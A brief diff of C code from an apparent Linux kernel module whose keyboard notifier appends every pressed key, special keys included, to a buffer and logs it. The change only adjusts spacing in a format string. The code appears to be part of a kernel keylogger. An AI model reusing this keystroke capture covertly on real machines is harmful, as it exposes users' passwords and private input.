@@ -154,7 +154,7 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
             
             }
             else{ //special string f.e. "SPACE"
-                snprintf(message + message_len, BUFFER_SIZE - message_len, " %s ", key_char); // Append string without spaces
+                snprintf(message + message_len, BUFFER_SIZE - message_len, " %s", key_char); // Append string without spaces
             }
             message_len += strlen(message + message_len);
             pr_info("Data: %s, size: %d", message, message_len);
